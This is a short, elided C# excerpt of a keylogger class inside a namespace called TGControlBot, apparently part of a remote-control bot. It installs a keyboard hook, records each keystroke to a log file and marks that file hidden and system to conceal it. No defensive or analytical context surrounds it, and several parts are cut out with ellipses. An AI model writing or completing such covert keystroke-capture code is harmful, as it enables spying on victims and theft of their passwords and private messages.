...
namespace TGControlBot
{
    class KeyLogger
    {
        public static string CurrentActiveWindowTitle;

        [STAThread]
        public static void Start()
        {

            _Hook_ID = SetHook(_proc);
            Application.Run();
        }
        ...
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            ...
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                ...
                using (StreamWriter sw = new StreamWriter(Help.LoggerLog, true))
                {
                    try
                    {
                        File.SetAttributes(Help.LoggerLog, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
        ...
        private static IntPtr _Hook_ID = IntPtr.Zero;
